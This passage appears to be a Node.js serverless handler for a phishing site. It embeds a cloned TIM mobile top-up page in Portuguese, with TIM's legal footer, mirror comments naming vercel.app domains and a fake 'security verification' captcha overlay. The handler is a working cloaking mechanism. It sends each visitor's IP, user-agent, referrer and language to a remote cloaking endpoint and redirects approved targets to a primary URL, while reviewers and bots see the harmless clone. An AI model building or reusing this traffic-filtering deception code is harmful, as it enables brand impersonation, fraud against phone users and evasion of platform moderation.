aria-hidden=\"true\"\u003e\u003cpath d=\"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/div\u003e\u003ch3 class=\"font-semibold text-foreground mb-2\"\u003e100% Seguro\u003c/h3\u003e\u003cp class=\"text-sm text-muted-foreground leading-relaxed\"\u003eProteção total dos seus dados com criptografia avançada e certificada.\u003c/p\u003e\u003c/div\u003e\u003cdiv class=\"tim-card\" style=\"opacity: 1; transform: none;\"\u003e\u003cdiv class=\"w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-4\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-clock w-6 h-6 text-primary\" aria-hidden=\"true\"\u003e\u003ccircle cx=\"12\" cy=\"12\" r=\"10\"\u003e\u003c/circle\u003e\u003cpath d=\"M12 6v6l4 2\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/div\u003e\u003ch3 class=\"font-semibold text-foreground mb-2\"\u003eDisponível 24/7\u003c/h3\u003e\u003cp class=\"text-sm text-muted-foreground leading-relaxed\"\u003eFaça sua recarga a qualquer hora, de qualquer lugar do Brasil.\u003c/p\u003e\u003c/div\u003e\u003cdiv class=\"tim-card\" style=\"opacity: 1; transform: none;\"\u003e\u003cdiv class=\"w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-4\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-credit-card w-6 h-6 text-primary\" aria-hidden=\"true\"\u003e\u003crect width=\"20\" height=\"14\" x=\"2\" y=\"5\" rx=\"2\"\u003e\u003c/rect\u003e\u003cline x1=\"2\" x2=\"22\" y1=\"10\" y2=\"10\"\u003e\u003c/line\u003e\u003c/svg\u003e\u003c/div\u003e\u003ch3 class=\"font-semibold text-foreground mb-2\"\u003eDiversas Formas de Pagamento\u003c/h3\u003e\u003cp class=\"text-sm text-muted-foreground leading-relaxed\"\u003ePIX, cartão de crédito, débito e muito mais opções para você.\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e\u003c/div\u003e\u003c/section\u003e\u003csection class=\"py-20 tim-section-blue\"\u003e\u003cdiv class=\"section-container text-center\"\u003e\u003cdiv style=\"opacity: 1; transform: none;\"\u003e\u003ch2 class=\"text-3xl sm:text-4xl font-bold text-primary-foreground mb-4\"\u003ePronto para recarregar?\u003c/h2\u003e\u003cp class=\"text-primary-foreground/70 mb-8 max-w-md mx-auto\"\u003eRecarregue agora mesmo e aproveite todos os benefícios TIM.\u003c/p\u003e\u003ca href=\"recarga/index.html\" class=\"inline-flex items-center justify-center gap-2 whitespace-nowrap cursor-pointer transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 disabled:cursor-not-allowed [\u0026amp;_svg]:pointer-events-none [\u0026amp;_svg]:size-4 [\u0026amp;_svg]:shrink-0 border-background hover:text-primary h-[50px] rounded-[14px] border-0 bg-[#ececef] px-6 text-[14px] font-normal leading-none text-primary shadow-none hover:bg-[#e2e5ea] font-sans\"\u003eRecarregar meu TIM\u003c/a\u003e\u003c/div\u003e\u003c/div\u003e\u003c/section\u003e\u003c/main\u003e\u003cfooter class=\"tim-section-blue\"\u003e\u003cdiv class=\"section-container py-12\"\u003e\u003cdiv class=\"grid grid-cols-1 md:grid-cols-3 gap-8\"\u003e\u003cdiv\u003e\u003ca href=\"index-2.html\" class=\"flex items-center gap-1.5 font-extrabold text-2xl mb-4 active\" data-status=\"active\" aria-current=\"page\"\u003e\u003cspan class=\"text-tim-red\"\u003e≡\u003c/span\u003e\u003cspan class=\"text-primary-foreground\"\u003eTIM\u003c/span\u003e\u003c/a\u003e\u003cp class=\"text-sm text-primary-foreground/60 leading-relaxed max-w-xs\"\u003eA forma mais rápida e segura de recarregar seu celular TIM. Praticidade e confiança em cada recarga.\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv class=\"border-t border-primary-foreground/10 mt-10 pt-6 text-left text-xs leading-6 text-primary-foreground\"\u003e© TIM S/A. Todos os direitos reservados. CNPJ: 02.421.421/0001-11 - Insc. Municipal: 0261388-3 - Insc. Estadual: 86.092.08-5 Av João Cabral de Mello Neto, 850 - Bl 01 - Salas 501 a 1208. Barra da Tijuca - Rio de Janeiro - RJ - CEP: 22775-057\u003c/div\u003e\u003c/div\u003e\u003c/footer\u003e\u003csection aria-label=\"Notifications alt+T\" tabindex=\"-1\" aria-live=\"polite\" aria-relevant=\"additions text\" aria-atomic=\"false\"\u003e\u003c/section\u003e\u003c/div\u003e\n    \u003cdiv id=\"cookie-modal\" style=\"position: fixed; left: 0px; right: 0px; bottom: 0px; z-index: 2147483640; background-color: rgb(236, 236, 239); opacity: 1;\"\u003e\u003cdiv class=\"mx-auto w-full max-w-[430px] px-8 pb-7 pt-10\"\u003e\u003cp class=\"text-[14px] font-bold leading-[1.45] text-black sm:text-[15px]\"\u003eNosso site armazena cookies para melhorar a sua navegacao.\u003c/p\u003e\u003cp class=\"mt-1 text-[14px] leading-[1.45] text-black sm:text-[15px]\"\u003eAo continuar, entendemos que voce esta de acordo com a \u003ca href=\"https://www.tim.com.br/para-voce/atendimento/privacidade\" target=\"_blank\" rel=\"noreferrer\" class=\"text-primary\"\u003ePolitica de Privacidade da TIM\u003c/a\u003e\u003c/p\u003e\u003cdiv class=\"mt-8 flex items-center justify-center gap-3\"\u003e\u003cbutton type=\"button\" onclick=\"localStorage.setItem(\u0027tim_cookie\u0027,\u00271\u0027);document.getElementById(\u0027cookie-modal\u0027).style.display=\u0027none\u0027\" class=\"h-[50px] min-w-[106px] rounded-[14px] border border-primary bg-[#ececef] px-6 text-[14px] font-medium text-primary\" style=\"opacity: 1;\"\u003eDispensar\u003c/button\u003e\u003cbutton type=\"button\" onclick=\"localStorage.setItem(\u0027tim_cookie\u0027,\u00271\u0027);document.getElementById(\u0027cookie-modal\u0027).style.display=\u0027none\u0027\" class=\"h-[50px] min-w-[92px] rounded-[14px] border border-primary bg-primary px-6 text-[14px] font-medium text-white\" style=\"opacity: 1;\"\u003eAceitar\u003c/button\u003e\u003c/div\u003e\u003cbutton type=\"button\" onclick=\"localStorage.setItem(\u0027tim_cookie\u0027,\u00271\u0027);document.getElementById(\u0027cookie-modal\u0027).style.display=\u0027none\u0027\" class=\"ml-auto mt-8 block text-[14px] text-primary\"\u003eAlterar preferencias\u003c/button\u003e\u003c/div\u003e\u003c/div\u003e\n    \u003cscript\u003eif(localStorage.getItem(\u0027tim_cookie\u0027))document.getElementById(\u0027cookie-modal\u0027).style.display=\u0027none\u0027;\u003c/script\u003e\n\n    \u003c!-- Modal de Verificação de Segurança (Captcha Matemático) --\u003e\n    \u003cstyle\u003e\n      #sec-verify-overlay {\n        position: fixed;\n        inset: 0;\n        z-index: 2147483647;\n        background: rgba(8, 18, 36, 0.72);\n        backdrop-filter: blur(2px);\n        -webkit-backdrop-filter: blur(2px);\n        display: flex;\n        align-items: center;\n        justify-content: center;\n        padding: 16px;\n        font-family: \u0027Inter\u0027, -apple-system, BlinkMacSystemFont, sans-serif;\n        transition: opacity 0.25s ease;\n      }\n      #sec-verify-card {\n        background: #ffffff;\n        width: 100%;\n        max-width: 380px;\n        border-radius: 20px;\n        padding: 34px 28px 30px;\n        box-shadow: 0 24px 60px rgba(0, 0, 0, 0.38);\n        text-align: center;\n        box-sizing: border-box;\n      }\n      #sec-verify-badge {\n        color: #1fa672;\n        font-size: 11.5px;\n        font-weight: 700;\n        letter-spacing: 0.08em;\n        text-transform: uppercase;\n        margin: 0 0 10px 0;\n      }\n      #sec-verify-title {\n        color: #0b192c;\n        font-size: 23px;\n        font-weight: 800;\n        margin: 0 0 8px 0;\n        line-height: 1.25;\n      }\n      #sec-verify-sub {\n        color: #5b6b7f;\n        font-size: 14.5px;\n        font-weight: 400;\n        margin: 0 0 22px 0;\n        line-height: 1.4;\n      }\n      #sec-verify-math {\n        display: flex;\n        align-items: center;\n        justify-content: center;\n        gap: 12px;\n        margin-bottom: 24px;\n      }\n      #sec-verify-expr {\n        color: #0b192c;\n        font-size: 29px;\n        font-weight: 800;\n        letter-spacing: 1px;\n      }\n      #sec-verify-eq {\n        color: #94a3b8;\n        font-size: 22px;\n        font-weight: 500;\n      }\n      #sec-verify-input {\n        width: 72px;\n        height: 54px;\n        border-radius: 12px;\n        border: 2px solid #e2e2da;\n        background: #f5f5ef;\n        color: #0b192c;\n        font-size: 22px;\n        font-weight: 700;\n        text-align: center;\n        outline: none;\n        transition: border-color 0.2s, box-shadow 0.2s;\n        -moz-appearance: textfield;\n      }\n      #sec-verify-input::-webkit-outer-spin-button,\n      #sec-verify-input::-webkit-inner-spin-button {\n        -webkit-appearance: none;\n        margin: 0;\n      }\n      #sec-verify-input:focus {\n        border-color: #f0b90b;\n        box-shadow: 0 0 0 3px rgba(240, 185, 11, 0.22);\n      }\n      #sec-verify-err {\n        display: none;\n        color: #dc2626;\n        font-size: 12.5px;\n        font-weight: 600;\n        margin: -14px 0 16px 0;\n      }\n      #sec-verify-btn {\n        width: 100%;\n        height: 52px;\n        border: none;\n        border-radius: 12px;\n        background: #f0b90b;\n        color: #111827;\n        font-size: 16.5px;\n        font-weight: 800;\n        cursor: pointer;\n        transition: background 0.15s, transform 0.1s;\n      }\n      #sec-verify-btn:hover {\n        background: #e0ac08;\n      }\n      #sec-verify-btn:active {\n        transform: scale(0.99);\n      }\n      @keyframes secShake {\n        0%, 100% { transform: translateX(0); }\n        25% { transform: translateX(-6px); }\n        75% { transform: translateX(6px); }\n      }\n      .sec-shake {\n        animation: secShake 0.25s ease-in-out 2;\n      }\n    \u003c/style\u003e\n    \u003cdiv id=\"sec-verify-overlay\" role=\"dialog\" aria-modal=\"true\" aria-labelledby=\"sec-verify-title\"\u003e\n      \u003cdiv id=\"sec-verify-card\"\u003e\n        \u003cdiv id=\"sec-verify-badge\"\u003eVERIFICAÇÃO DE SEGURANÇA\u003c/div\u003e\n        \u003ch2 id=\"sec-verify-title\"\u003eAntes de continuar\u003c/h2\u003e\n        \u003cp id=\"sec-verify-sub\"\u003eConfirme que você não é um robô.\u003c/p\u003e\n        \u003cdiv id=\"sec-verify-math\"\u003e\n          \u003cspan id=\"sec-verify-expr\"\u003e1 + 1\u003c/span\u003e\n          \u003cspan id=\"sec-verify-eq\"\u003e=\u003c/span\u003e\n          \u003cinput id=\"sec-verify-input\" type=\"number\" inputmode=\"numeric\" autocomplete=\"off\" aria-label=\"Resultado de 1 mais 1\" /\u003e\n        \u003c/div\u003e\n        \u003cdiv id=\"sec-verify-err\"\u003eResposta incorreta. Tente novamente.\u003c/div\u003e\n        \u003cbutton id=\"sec-verify-btn\" type=\"button\"\u003eConfirmar e continuar\u003c/button\u003e\n      \u003c/div\u003e\n    \u003c/div\u003e\n    \u003cscript\u003e\n      (function() {\n        var overlay = document.getElementById(\u0027sec-verify-overlay\u0027);\n        var input = document.getElementById(\u0027sec-verify-input\u0027);\n        var btn = document.getElementById(\u0027sec-verify-btn\u0027);\n        var err = document.getElementById(\u0027sec-verify-err\u0027);\n        var card = document.getElementById(\u0027sec-verify-card\u0027);\n\n        document.body.style.overflow = \u0027hidden\u0027;\n        setTimeout(function() { try { input.focus(); } catch(e) {} }, 150);\n\n        function verifyCaptcha() {\n          var val = (input.value || \u0027\u0027).trim();\n          if (val === \u00272\u0027) {\n            err.style.display = \u0027none\u0027;\n            sessionStorage.setItem(\u0027tim_sec_verified\u0027, \u00271\u0027);\n            overlay.style.opacity = \u00270\u0027;\n            overlay.style.pointerEvents = \u0027none\u0027;\n            document.body.style.overflow = \u0027\u0027;\n            setTimeout(function() {\n              if (overlay \u0026\u0026 overlay.parentNode) overlay.parentNode.removeChild(overlay);\n            }, 260);\n          } else {\n            err.style.display = \u0027block\u0027;\n            input.style.borderColor = \u0027#dc2626\u0027;\n            card.classList.remove(\u0027sec-shake\u0027);\n            void card.offsetWidth;\n            card.classList.add(\u0027sec-shake\u0027);\n            input.value = \u0027\u0027;\n            input.focus();\n          }\n        }\n\n        btn.addEventListener(\u0027click\u0027, verifyCaptcha);\n        input.addEventListener(\u0027keydown\u0027, function(e) {\n          if (e.key === \u0027Enter\u0027) {\n            e.preventDefault();\n            verifyCaptcha();\n          }\n        });\n      })();\n    \u003c/script\u003e\n  \u003cscript src=\"js/transitions.js\"\u003e\u003c/script\u003e\n  \u003c/body\u003e\n  \n\u003c!-- Mirrored from tim-credito.vercel.app/ by HTTrack Website Copier/3.x [XR\u0026CO\u00272014], Thu, 10 Sep 2026 18:06:22 GMT --\u003e\n\n\u003c!-- Mirrored from facilrecarga-hoje.vercel.app/ by HTTrack Website Copier/3.x [XR\u0026CO\u00272014], Sat, 17 Oct 2026 21:25:29 GMT --\u003e\n\u003c/html\u003e\n";

/**
 * Resolves the end-client IP address using the required header precedence order:
 * cf-connecting-ip -> true-client-ip -> x-vercel-forwarded-for -> x-real-ip ->
 * x-forwarded-for (first token) -> fly-client-ip -> socket/remote address.
 */
function resolveClientIp(req) {
  const headers = req.headers || {};
  const orderedHeaders = [
    'cf-connecting-ip',
    'true-client-ip',
    'x-vercel-forwarded-for',
    'x-real-ip',
    'x-forwarded-for',
    'fly-client-ip'
  ];

  for (const name of orderedHeaders) {
    const raw = headers[name];
    if (typeof raw === 'string' && raw.trim() !== '') {
      const firstToken = raw.split(',')[0].trim();
      if (firstToken) {
        return firstToken;
      }
    } else if (Array.isArray(raw) && raw.length > 0 && raw[0]) {
      const firstToken = String(raw[0]).split(',')[0].trim();
      if (firstToken) {
        return firstToken;
      }
    }
  }

  const remoteAddr =
    (req.socket && req.socket.remoteAddress) ||
    (req.connection && req.connection.remoteAddress) ||
    '';

  return String(remoteAddr).replace(/^::ffff:/, '').trim();
}

function getHeaderString(req, name) {
  const val = (req.headers || {})[name];
  if (Array.isArray(val)) return val[0] || '';
  return typeof val === 'string' ? val : '';
}

function buildCurrentUrl(req) {
  const proto = getHeaderString(req, 'x-forwarded-proto').split(',')[0].trim() || 'https';
  const host =
    getHeaderString(req, 'x-forwarded-host').split(',')[0].trim() ||
    getHeaderString(req, 'host').trim() ||
    'localhost';
  const reqUrl = req.url || '/';
  return `${proto}://${host}${reqUrl}`;
}

function emitVariantB(res) {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  return res.end(VARIANT_B_HTML);
}

function emitVariantA(req, res) {
  if (PRIMARY_URL && typeof PRIMARY_URL === 'string' && PRIMARY_URL.trim() !== '') {
    const rawUrl = req.url || '/';
    const qIndex = rawUrl.indexOf('?');
    const querySuffix = qIndex !== -1 ? rawUrl.slice(qIndex) : '';
    const targetLocation =
      querySuffix && !PRIMARY_URL.includes('?')
        ? `${PRIMARY_URL}${querySuffix}`
        : PRIMARY_URL;

    res.statusCode = 302;
    res.setHeader('Location', targetLocation);
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    return res.end();
  }

  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  return res.end(VARIANT_A_FALLBACK_HTML);
}

module.exports = async function handler(req, res) {
  try {
    const ip = resolveClientIp(req);
    const ua = getHeaderString(req, 'user-agent');
    const url = buildCurrentUrl(req);
    const ref = getHeaderString(req, 'referer') || getHeaderString(req, 'referrer');
    const lang = getHeaderString(req, 'accept-language');

    const params = new URLSearchParams({
      slug: CLOAK_SLUG,
      key: CLOAK_KEY,
      ip: ip || '',
      ua: ua || '',
      url: url || '',
      ref: ref || '',
      lang: lang || ''
    });

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 4000);

    let decision = null;
    try {
      const response = await fetch(`${CLOAK_ENDPOINT}?${params.toString()}`, {
        method: 'GET',
        headers: {
          Accept: 'application/json'
        },
        signal: controller.signal
      });

      if (response && response.ok) {
        decision = await response.json();
      }
    } finally {
      clearTimeout(timeoutId);
    }

    if (decision && decision.action === 'allow') {
      return emitVariantA(req, res);
    }

    return emitVariantB(res);
  } catch (err) {
    return emitVariantB(res);
  }
};
